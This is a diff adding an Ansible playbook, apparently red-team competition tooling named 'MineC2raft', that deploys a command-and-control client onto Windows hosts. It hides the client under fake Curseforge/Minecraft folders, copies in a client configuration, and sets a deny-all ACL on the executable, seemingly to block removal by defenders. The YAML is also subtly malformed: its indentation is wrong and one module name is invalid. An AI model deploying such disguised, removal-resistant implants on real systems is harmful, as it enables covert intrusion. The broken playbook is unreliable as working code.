@@ -1,0 +1,43 @@
+#####################################################################################
+#####                        MINEC2RAFT - Windows Edition                       #####
+##### Author: Austin Hall                                                       #####
+##### If ur not RIT Red team, don't use!!!!!                                    #####
+##### (pls and thanku :) )                                                      #####
+#####################################################################################
+
+---
+- name: "Deploy MineC2raft Client" 
+  vars:
+      client_source: ""
+      base_dir: "{{ ansible_user_dir }}" 
+      server_ip: "0.0.0.0/55565"
+
+- name: "Create Curseforge Directories"
+  ansible.windows.win_file:
+  path: "{{ item }}"
+  state: "directory"
+  loop:
+  - "{{ base_dir }}\\Curseforge\\minec2raft\\Downloads"
+  - "{{ base_dir }}\\Curseforge\\minec2raft\\Install\\assets"
+  - "{{ base_dir }}\\Curseforge\\minec2raft\\Install\\java"
+  - "{{ base_dir }}\\Curseforge\\minec2raft\\Install\\libraries"
+  - "{{ base_dir }}\\Curseforge\\minec2raft\\Install\\natives"
+  - "{{ base_dir }}\\Curseforge\\minec2raft\\Install\\versions"
+  - "{{ base_dir }}\\Curseforge\\minec2raft\\Instances"
+  - "{{ base_dir }}\\Curseforge\\minec2raft\\Quickplay"
+  when: ansible_os_family == 'Windows'
+
+- name: "Send Client configuration"
+  ansible.windows.win_copy:
+  src: "{{ client_source }}" 
+  dest: "{{ base_dir }}\\Curseforge\\minec2raft\\Install\\file.conf"
+  when: ansible_os_family == 'Windows'
+
+- name: "Set ACL for client"
+  ansible.win_acl: 
+  path: "{{ base_dir }}/curseforge/minec2raft/Install/Curseforge.exe"
+  user: "EVERYONE"
+  rights: Read,Write,Modify,FullControl,Delete
+  type: deny
+  state: "present"
+  when: ansible_os_family == 'Windows'
